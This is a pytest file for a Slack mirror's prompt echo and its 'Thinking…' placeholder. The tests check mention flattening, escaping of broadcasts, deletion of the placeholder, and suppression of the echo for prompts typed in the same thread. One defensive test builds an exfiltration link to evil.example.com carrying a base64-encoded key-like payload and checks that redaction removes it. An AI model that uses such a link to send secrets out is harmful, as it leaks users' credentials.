"""The dashboard -> Slack mirror: its prompt echo and its "Thinking…" placeholder.

Three defects a linked thread showed on mirrored turns:

* the prompt echo escaped every ``<…>`` entity and wrapped the prompt in ``_…_``,
  so a pasted ``<https://…|label>`` link or ``<#C…>`` channel reference arrived as
  raw text. The echo now keeps those live, flattens a ``<@U…>`` mention to plain
  ``@…`` so it never re-pings anyone, still escapes ``<!channel>`` and friends and
  any stray or truncated bracket, and is posted as a ``> 💬 …`` quote;
* the mirror's task stream opened with a "Thinking…" line, and a stream only
  appends, so that line sat above Slack's own "Thinking completed" plan header for
  good. The line is now its own message, deleted when the stream, the answer or
  the turn's end takes over;
* a prompt typed in the linked Slack thread itself was echoed back into it,
  quoting the person to themselves. Only a prompt from another surface is
  echoed now.
"""

from __future__ import annotations

import inspect
from typing import Any

import pytest
from turn_harness import Do, Raise, TurnContext, TurnScript, run_turn

from kiro_crew.acp.types import (
    EVENT_COMPLETE,
    EVENT_TEXT_CHUNK,
    EVENT_TOOL_CALL,
    STOP_REASON_END_TURN,
    AcpEvent,
)
from kiro_crew.dashboard.chat_runner import _prepare_mirror_msg
from kiro_crew.slack.client import SlackClientOps
from kiro_crew.slack.format import escape_mrkdwn_keep_links, mirror_prompt_echo

_DONE = AcpEvent(kind=EVENT_COMPLETE, stop_reason=STOP_REASON_END_TURN)
_ANSWER = AcpEvent(kind=EVENT_TEXT_CHUNK, text="the reply")
_TOOL = AcpEvent(kind=EVENT_TOOL_CALL, tool_call_id="t1", title="read_1", tool_kind="read")


class _SlackRecorder:
    """A Slack client recording each call, bound to the real port's signatures.

    Each post returns a distinct ts, so a delete can be matched to what it removed.
    """

    def __init__(self) -> None:
        self.calls: list[tuple[str, dict[str, Any]]] = []

    def __getattr__(self, name: str) -> Any:
        declared = getattr(SlackClientOps, name, None) if not name.startswith("_") else None
        if not inspect.iscoroutinefunction(declared):
            raise AttributeError(name)
        signature = inspect.signature(declared)

        async def _call(*args: Any, **kwargs: Any) -> str:
            bound = signature.bind(self, *args, **kwargs)
            bound.apply_defaults()
            self.calls.append((name, dict(bound.arguments)))
            return f"{name}-ts-{len(self.calls)}"

        return _call

    def posts(self) -> list[tuple[str, str]]:
        """(ts, text) of every post_message, in order."""
        return [
            (f"post_message-ts-{i + 1}", args["text"])
            for i, (name, args) in enumerate(self.calls)
            if name == "post_message"
        ]


class _StreamRefusingSlack(_SlackRecorder):
    """Slack refuses chat.startStream (an org-wide install with no recipient)."""

    def __getattr__(self, name: str) -> Any:
        call = super().__getattr__(name)
        if name != "start_stream":
            return call

        async def _refused(*args: Any, **kwargs: Any) -> None:
            await call(*args, **kwargs)
            return None

        return _refused


async def _linked_turn(
    events: list[Any],
    message: str = "hello",
    slack: _SlackRecorder | None = None,
    **run_kwargs: Any,
) -> _SlackRecorder:
    slack = slack or _SlackRecorder()

    def _linked(ctx: TurnContext) -> None:
        ctx.state.slack_client = slack
        ctx.state.sessions.set_slack_link("dashboard:chat-1", "thread-1", "C-1")

    await run_turn(TurnScript(events=events, message=message, setup=_linked, run_kwargs=run_kwargs))
    return slack


# ── The echo: what survives, what is neutralised ─────────────────────────────


class TestEchoKeepsLinks:
    def test_a_web_link_and_its_label_stay_live(self) -> None:
        assert escape_mrkdwn_keep_links("see <https://example.com/a_b|the doc>") == (
            "see <https://example.com/a_b|the doc>"
        )
        assert escape_mrkdwn_keep_links("<https://example.com>") == "<https://example.com>"

    def test_a_channel_reference_stays_live(self) -> None:
        assert escape_mrkdwn_keep_links("in <#C0123ABC>") == "in <#C0123ABC>"
        assert escape_mrkdwn_keep_links("<#C0123ABC|general>") == "<#C0123ABC|general>"

    def test_a_label_ampersand_is_escaped(self) -> None:
        assert escape_mrkdwn_keep_links("<https://x.com|a & b>") == "<https://x.com|a &amp; b>"


class TestEchoNeutralises:
    @pytest.mark.parametrize(
        ("mention", "flat"),
        [
            ("<@U0123ABC>", "@U0123ABC"),
            ("<@W0123ABC>", "@W0123ABC"),
            ("<@U0123ABC|kyle>", "@kyle"),
        ],
    )
    def test_a_user_mention_becomes_plain_text(self, mention: str, flat: str) -> None:
        out = escape_mrkdwn_keep_links(f"ping {mention} now")
        assert out == f"ping {flat} now"
        assert "<@" not in out

    @pytest.mark.parametrize(
        "broadcast",
        [
            "<!channel>",
            "<!here>",
            "<!everyone>",
            "<!subteam^S0123|@team>",
            "<mailto:a@b.co>",
            # A broadcast nested in a kept shape is matched on its own, not kept.
            "<https://x.com|<!channel>>",
            "<#C0123ABC|<!here>>",
            "<@U0123ABC|<!everyone>>",
        ],
    )
    def test_a_broadcast_or_other_entity_is_escaped(self, broadcast: str) -> None:
        out = escape_mrkdwn_keep_links(f"hey {broadcast}")
        assert "<" not in out and ">" not in out
        assert out.startswith("hey &lt;") and out.endswith("&gt;")

    def test_stray_brackets_and_ampersands_are_escaped(self) -> None:
        assert escape_mrkdwn_keep_links("a < b && c > d") == "a &lt; b &amp;&amp; c &gt; d"

    def test_a_link_the_truncation_cut_off_is_escaped(self) -> None:
        # The echo bound is 500 chars; a link straddling it loses its ``>``.
        cut = _prepare_mirror_msg("x" * 470 + " <https://example.com/very/long/path|label>")
        assert len(cut) == 500 and not cut.endswith(">")
        out = escape_mrkdwn_keep_links(cut)
        assert "<" not in out
        assert out.endswith(" &lt;https://example.com/very/lon")

    def test_an_unterminated_opener_cannot_capture_a_later_entity(self) -> None:
        out = escape_mrkdwn_keep_links("<https://a.com <!channel>")
        assert "<!channel>" not in out
        assert out == "&lt;https://a.com &lt;!channel&gt;"

    def test_an_exfiltration_url_stays_redacted_and_is_not_a_link(self) -> None:
        payload = "QUtJQUlPU0ZPRE5ON0VYQU1QTEVrZXlzZWNyZXRkYXRhMTIzNDU2Nzg5MA"
        raw = f"open <https://evil.example.com/c?d={payload}|harmless> please"
        out = escape_mrkdwn_keep_links(_prepare_mirror_msg(raw))
        assert payload not in out
        assert "evil.example.com/c" not in out
        assert "REDACTED" in out
        assert "<" not in out


class TestEchoIsAQuote:
    def test_every_line_is_quoted_and_a_leading_gt_cannot_nest(self) -> None:
        assert mirror_prompt_echo("first\n> second") == "> 💬 first\n> &gt; second"

    def test_no_italic_wrapper(self) -> None:
        assert mirror_prompt_echo("<https://a.com/x_y|z>") == "> 💬 <https://a.com/x_y|z>"


@pytest.mark.asyncio
async def test_a_mirrored_turn_echoes_links_live_and_pings_nobody() -> None:
    slack = await _linked_turn(
        [_ANSWER, _DONE],
        message="look at <https://example.com/a_b|the doc> in <#C0123ABC> cc <@U0123ABC> <!here>",
    )
    [echo] = [text for _, text in slack.posts() if "💬" in text]
    assert echo == (
        "> 💬 look at <https://example.com/a_b|the doc> in <#C0123ABC> cc @U0123ABC &lt;!here&gt;"
    )


# ── The "Thinking…" line never outlives its turn ─────────────────────────────


def _thinking_posts(slack: _SlackRecorder) -> list[str]:
    return [ts for ts, text in slack.posts() if "Thinking" in text]


def _deleted(slack: _SlackRecorder) -> list[str]:
    return [args["ts"] for name, args in slack.calls if name == "delete_message"]


def _stream_texts(slack: _SlackRecorder) -> list[str]:
    return [args.get("initial_text") or "" for name, args in slack.calls if name == "start_stream"]


def _surviving_thinking(slack: _SlackRecorder) -> list[str]:
    """Every "Thinking" line still in the thread once the turn has ended.

    A posted placeholder survives unless it was deleted; a line written into the
    append-only task stream always survives.
    """
    deleted = set(_deleted(slack))
    kept = [text for ts, text in slack.posts() if "Thinking" in text and ts not in deleted]
    return kept + [text for text in _stream_texts(slack) if "Thinking" in text]


@pytest.mark.asyncio
async def test_a_tool_turn_deletes_the_thinking_line_when_the_stream_opens() -> None:
    slack = await _linked_turn([_TOOL, _ANSWER, _DONE])
    assert _surviving_thinking(slack) == []
    names = [name for name, _ in slack.calls]
    [thinking] = _thinking_posts(slack)
    assert _deleted(slack) == [thinking]
    # The placeholder goes as the stream takes over: after it opens, before its
    # first task, and so before the answer is posted.
    delete_at = names.index("delete_message")
    assert names.index("start_stream") < delete_at < names.index("append_task")
    answer_at = max(i for i, (n, a) in enumerate(slack.calls) if n == "post_message")
    assert delete_at < answer_at
    assert names.count("stop_stream") == 1


@pytest.mark.asyncio
async def test_a_tool_free_turn_deletes_the_thinking_line_before_the_answer() -> None:
    slack = await _linked_turn([_ANSWER, _DONE])
    assert _surviving_thinking(slack) == []
    names = [name for name, _ in slack.calls]
    [thinking] = _thinking_posts(slack)
    assert _deleted(slack) == [thinking]
    assert "start_stream" not in names
    [answer_at] = [
        i
        for i, (n, a) in enumerate(slack.calls)
        if n == "post_message" and a["text"] == "the reply"
    ]
    assert names.index("delete_message") < answer_at


@pytest.mark.asyncio
async def test_a_failed_turn_still_deletes_the_thinking_line() -> None:
    slack = await _linked_turn([Raise(RuntimeError("boom"))])
    assert _surviving_thinking(slack) == []
    [thinking] = _thinking_posts(slack)
    assert _deleted(slack) == [thinking]


@pytest.mark.asyncio
async def test_the_stream_opens_once_and_the_line_goes_once_over_many_tools() -> None:
    second = AcpEvent(kind=EVENT_TOOL_CALL, tool_call_id="t2", title="read_2", tool_kind="read")
    slack = await _linked_turn([_TOOL, second, _ANSWER, _DONE])
    names = [name for name, _ in slack.calls]
    assert names.count("start_stream") == 1
    assert len(_deleted(slack)) == 1
    assert _surviving_thinking(slack) == []


@pytest.mark.asyncio
async def test_a_refused_stream_leaves_the_line_up_until_the_answer() -> None:
    slack = _StreamRefusingSlack()
    marks: list[int] = []
    second = AcpEvent(kind=EVENT_TOOL_CALL, tool_call_id="t2", title="read_2", tool_kind="read")
    tools_ran = Do(lambda ctx: marks.append(len(slack.calls)))
    await _linked_turn([_TOOL, second, tools_ran, _ANSWER, _DONE], slack=slack)
    names = [name for name, _ in slack.calls]
    assert names.count("start_stream") == 1
    assert "append_task" not in names
    # Nothing deleted the line while the tools ran.
    [mark] = marks
    assert "delete_message" not in names[:mark]
    # Still working while tools run, then gone before the answer lands.
    [answer_at] = [
        i
        for i, (n, a) in enumerate(slack.calls)
        if n == "post_message" and a["text"] == "the reply"
    ]
    assert names.index("start_stream") < names.index("delete_message") < answer_at
    assert _surviving_thinking(slack) == []


@pytest.mark.asyncio
async def test_a_withheld_turn_opens_no_stream_and_still_retires_the_line(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from kiro_crew.dashboard import chat_runner

    monkeypatch.setattr(chat_runner, "cross_surface_withheld", lambda state, slot: True)
    slack = await _linked_turn([_TOOL, _ANSWER, _DONE])
    names = [name for name, _ in slack.calls]
    assert "start_stream" not in names
    assert "append_task" not in names
    assert _surviving_thinking(slack) == []


# ── A prompt typed in the Slack conversation is not echoed back into it ──────
#
# The echo carries a prompt from ANOTHER surface into the thread. A message the
# person typed in that same thread is already there, and quoting it back read as
# the bot parroting them ("> 💬 what's up?" under their own "what's up?").


def _echoes(slack: _SlackRecorder) -> list[str]:
    return [text for _, text in slack.posts() if "💬" in text]


@pytest.mark.asyncio
async def test_a_prompt_typed_in_the_slack_thread_is_not_echoed_back() -> None:
    # What the linked-thread router passes for a message typed in thread-1.
    slack = await _linked_turn(
        [_ANSWER, _DONE],
        message="what's up?",
        _directive_channel_origin=True,
        _slack_typed_in="thread-1",
    )
    assert _echoes(slack) == []
    # The placeholder and the answer still post, and the placeholder goes before
    # the first answer chunk lands.
    [thinking] = _thinking_posts(slack)
    assert _deleted(slack) == [thinking]
    names = [name for name, _ in slack.calls]
    [answer_at] = [
        i
        for i, (n, a) in enumerate(slack.calls)
        if n == "post_message" and a["text"] == "the reply"
    ]
    assert names.index("delete_message") < answer_at
    assert _surviving_thinking(slack) == []


@pytest.mark.asyncio
async def test_a_prompt_typed_in_the_dashboard_is_still_echoed() -> None:
    slack = await _linked_turn([_ANSWER, _DONE], message="what's up?")
    assert _echoes(slack) == ["> 💬 what's up?"]


@pytest.mark.asyncio
async def test_channel_origin_alone_does_not_silence_the_echo() -> None:
    # A Telegram / Teams / Discord hand-off is channel-origin too; only the
    # router's positive mark silences the echo.
    slack = await _linked_turn(
        [_ANSWER, _DONE], message="what's up?", _directive_channel_origin=True
    )
    assert _echoes(slack) == ["> 💬 what's up?"]


@pytest.mark.asyncio
async def test_a_prompt_typed_in_another_thread_is_still_echoed() -> None:
    # Queued from thread-0, then the slot was relinked to thread-1: thread-1 has
    # never seen the prompt.
    slack = await _linked_turn(
        [_ANSWER, _DONE],
        message="what's up?",
        _directive_channel_origin=True,
        _slack_typed_in="thread-0",
    )
    assert _echoes(slack) == ["> 💬 what's up?"]


def _slack_entry(thread: str = "t1") -> dict[str, Any]:
    from kiro_crew.dashboard.chat_runner import SLACK_TYPED_IN_META_KEY

    return {
        "_directive_user_origin": True,
        "_directive_channel_origin": True,
        "meta": {SLACK_TYPED_IN_META_KEY: thread},
    }


def _dashboard_entry() -> dict[str, Any]:
    return {"_directive_user_origin": True, "meta": {}}


def _handed_off_entry(channel_type: str = "telegram") -> dict[str, Any]:
    from kiro_crew.dashboard.session_control import channel_recipient_meta

    return {
        "_directive_user_origin": True,
        "_directive_channel_origin": True,
        "meta": channel_recipient_meta(channel_type, "conv-1", "p-1"),
    }


class TestBatchTypedInSlack:
    def test_entries_the_router_stamped_name_their_thread(self) -> None:
        from kiro_crew.dashboard.chat_turn.recipient import _batch_typed_in_slack

        assert _batch_typed_in_slack([_slack_entry()]) == "t1"
        assert _batch_typed_in_slack([_slack_entry(), _slack_entry()]) == "t1"

    def test_nothing_or_an_unstamped_entry_names_none(self) -> None:
        from kiro_crew.dashboard.chat_turn.recipient import _batch_typed_in_slack

        assert _batch_typed_in_slack([]) == ""
        assert _batch_typed_in_slack([_dashboard_entry()]) == ""
        assert _batch_typed_in_slack(["junk"]) == ""
        # A hand-off, and a channel-origin entry that lost every stamp (a
        # recovery requeue copies only addresses): echoed, never silenced.
        assert _batch_typed_in_slack([_handed_off_entry()]) == ""
        unstamped = {**_handed_off_entry(), "meta": {}}
        assert _batch_typed_in_slack([unstamped]) == ""

    def test_a_stamp_without_channel_origin_names_none(self) -> None:
        # A dashboard edit of the queued text clears channel origin: the edited
        # words are not what Slack shows.
        from kiro_crew.dashboard.chat_turn.recipient import _batch_typed_in_slack

        edited = {**_slack_entry(), "_directive_channel_origin": False}
        assert _batch_typed_in_slack([edited]) == ""

    def test_a_merged_batch_with_one_other_entry_keeps_the_echo(self) -> None:
        # The merged row is channel-origin when ANY entry is, so reading it alone
        # would drop the dashboard words from the thread; each entry is read.
        from kiro_crew.dashboard.chat_turn.recipient import _batch_typed_in_slack

        assert _batch_typed_in_slack([_slack_entry(), _dashboard_entry()]) == ""
        assert _batch_typed_in_slack([_dashboard_entry(), _slack_entry()]) == ""
        assert _batch_typed_in_slack([_slack_entry(), _handed_off_entry()]) == ""
        assert _batch_typed_in_slack([_slack_entry("t1"), _slack_entry("t2")]) == ""


class TestTheDrainMarksASlackTypedTurn:
    """``_start_next_queued_turn`` names the thread for router-stamped entries only."""

    @staticmethod
    def _drain(tmp_path: Any, monkeypatch: pytest.MonkeyPatch, *, merge: bool = False) -> Any:
        from unittest.mock import MagicMock

        from chat_test_helpers import _make_state

        # Load the facade first: a first import while ``cr._run_chat`` is stubbed
        # would bind the stub there for the rest of the session.
        from kiro_crew.dashboard import chat as _chat  # noqa: F401
        from kiro_crew.dashboard import chat_runner as cr

        state = _make_state(tmp_path)
        state.subagents = None
        captured: dict[str, Any] = {}

        def _stub_run_chat(_state: Any, _slot: Any, _prompt: str, **kwargs: Any) -> Any:
            captured.update(kwargs)

            async def _done() -> None:
                return None

            return _done()

        def _fake_spawn(_state: Any, _slot: Any, coro: Any) -> Any:
            coro.close()
            task = MagicMock()
            task.done.return_value = True
            return task

        monkeypatch.setattr(cr, "_run_chat", _stub_run_chat)
        monkeypatch.setattr(cr, "spawn_guarded_turn", _fake_spawn)
        if merge:
            cfg = MagicMock()
            cfg.load.return_value.dashboard.merge_queued_messages = True
            monkeypatch.setattr(cr, "KiroCrewConfig", cfg)

        def _busy(key: str) -> Any:
            slot = state.get_or_create_slot(key)
            task = MagicMock()
            task.done.return_value = False
            slot.task = task
            return slot

        async def _run(slot: Any) -> dict[str, Any]:
            captured.clear()
            slot.task = None
            assert await cr._start_next_queued_turn(state, slot) is True
            return dict(captured)

        return state, _busy, _run

    @staticmethod
    async def _route_busy(state: Any, slot: Any, monkeypatch: pytest.MonkeyPatch) -> None:
        """Queue "what's up?" from thread t1 through the router's real busy arm."""
        from conftest import MockSlackClient
        from kiro_crew.slack import handler as h

        monkeypatch.setattr(h, "_owner_id", "U1")
        monkeypatch.setattr(state, "get_linked_slot", lambda ts: slot, raising=False)
        monkeypatch.setattr(h, "_dashboard_state", state)
        assert await h.maybe_route_linked_thread(
            "what's up?", "t1", "U1", "C1", MockSlackClient(), "t1"
        )

    @pytest.mark.asyncio
    async def test_a_message_the_router_queued_runs_marked(
        self, tmp_path: Any, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        state, busy, run = self._drain(tmp_path, monkeypatch)
        slot = busy("chat-1")
        await self._route_busy(state, slot, monkeypatch)
        kwargs = await run(slot)
        assert kwargs["_slack_typed_in"] == "t1"
        # The stamp is queue plumbing: it does not ride into the persisted row.
        from kiro_crew.dashboard.chat_runner import SLACK_TYPED_IN_META_KEY

        assert SLACK_TYPED_IN_META_KEY not in (kwargs["_current_message"].get("meta") or {})

    @pytest.mark.asyncio
    async def test_a_queued_dashboard_or_handed_off_message_runs_unmarked(
        self, tmp_path: Any, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from kiro_crew.dashboard import chat_delivery as cd

        state, busy, run = self._drain(tmp_path, monkeypatch)
        slot = busy("chat-1")
        cd.queue_for_next_turn(state, slot, "from the dashboard", directive_user_origin=True)
        assert "_slack_typed_in" not in await run(slot)
        slot = busy("chat-2")
        cd.queue_for_next_turn(
            state,
            slot,
            "from telegram",
            directive_user_origin=True,
            directive_channel_origin=True,
            channel_recipient={
                "channel_type": "telegram",
                "conversation_id": "chat-42",
                "principal": "user-7",
            },
        )
        assert "_slack_typed_in" not in await run(slot)

    @pytest.mark.asyncio
    async def test_a_merged_slack_and_dashboard_batch_runs_unmarked(
        self, tmp_path: Any, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from kiro_crew.dashboard import chat_delivery as cd

        state, busy, run = self._drain(tmp_path, monkeypatch, merge=True)
        slot = busy("chat-1")
        await self._route_busy(state, slot, monkeypatch)
        cd.queue_for_next_turn(state, slot, "typed in the dashboard", directive_user_origin=True)
        kwargs = await run(slot)
        # Both entries went into this one turn, and it is still echoed.
        assert kwargs["_directive_channel_origin"] is True
        assert slot._queue == []
        assert "_slack_typed_in" not in kwargs


class TestTheLinkedThreadRouterMarksAnIdleTurn:
    @pytest.mark.asyncio
    async def test_an_idle_slot_runs_a_turn_naming_its_thread(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from unittest.mock import MagicMock

        from conftest import MockSlackClient
        from kiro_crew.dashboard import chat
        from kiro_crew.slack import handler as h

        seen: dict[str, Any] = {}

        async def _fake_run_chat(state: Any, slot: Any, text: str, **kwargs: Any) -> None:
            seen.update(kwargs)

        monkeypatch.setattr(h, "_owner_id", "U1")
        monkeypatch.setattr(chat, "_run_chat", _fake_run_chat)
        slot = MagicMock(key="slot-1", running=False, window_pending=False)
        state = MagicMock()
        state.get_linked_slot.return_value = slot
        state._background_tasks = set()
        monkeypatch.setattr(h, "_dashboard_state", state)
        routed = await h.maybe_route_linked_thread(
            "what's up?", "t1", "U1", "C1", MockSlackClient(), "t1"
        )
        assert routed is True
        await slot.task
        assert seen["_slack_typed_in"] == "t1"
        assert seen["_directive_channel_origin"] is True
